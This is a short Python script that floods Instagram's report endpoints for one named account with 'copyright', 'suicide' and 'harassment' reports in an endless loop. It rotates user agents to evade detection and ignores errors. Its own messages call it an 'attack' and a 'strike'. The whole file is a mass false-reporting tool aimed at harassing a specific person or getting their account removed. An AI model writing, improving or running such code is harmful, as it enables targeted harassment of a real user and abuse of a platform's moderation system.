import requests
import time
import random

target = "7i7.m"
url = f"https://www.instagram.com/{target}/"

agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1"
]

print(f"🚨 [LEGAL STRIKE] Initiating attack on {target}...")

while True:
    try:
        headers = {'User-Agent': random.choice(agents)}
        for t in ['copyright', 'suicide', 'harassment']:
            response = requests.post(f"{url}report/{t}/", headers=headers, timeout=5)
            if response.status_code == 200:
                print(f"🔥 Strike [{t.upper()}] Success!")
    except:
        pass
    time.sleep(0.1)
    
